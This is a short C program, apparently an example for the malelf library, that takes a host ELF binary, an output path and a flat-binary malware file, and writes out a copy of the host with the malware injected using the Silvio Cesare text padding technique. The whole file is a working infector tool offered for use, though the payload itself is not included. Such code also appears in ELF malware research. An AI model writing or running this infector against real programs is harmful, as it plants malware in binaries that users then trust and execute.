/**
 * Infects a host binary with the Silvio Cesare Text Padding Technique
 */
#include <stdio.h>

#include <malelf/binary.h>
#include <malelf/error.h>
#include <malelf/infect.h>

int main(int argc, char **argv)
{
        MalelfBinary input, output, malware;
        unsigned long int magic_bytes = 0;
        _u32 error;

        if (argc < 4) {
                fprintf(stderr, "usage: %s <input> <output> <malware>\n",
                        *argv);
                return 0;
        }

        /* Initialize the binaries structures */
        malelf_binary_init(&input);
        malelf_binary_init(&output);
        malelf_binary_init(&malware);

        /* Open the input host binary */
        error = malelf_binary_open(&input, argv[1]);
        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        /* Tell malelficus that the binary below is a assembled flat binary */
        malware.class = MALELF_FLAT;
        error = malelf_binary_open(&malware, argv[3]);
        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        output.fname = argv[2];

        /* Infects the output binary in memory with malware
           using the silvio cesare text padding technique */
        error = malelf_infect_silvio_padding(&input,
                                             &output,
                                             &malware,
                                             0,
                                             magic_bytes);

        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        /* Write the infected memory structure on disk */
        error = malelf_binary_write(&output, output.fname, 1);

        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        /* close files and deallocate memory */
        malelf_binary_close(&input);
        malelf_binary_close(&output);
        malelf_binary_close(&malware);

        return 0;
}
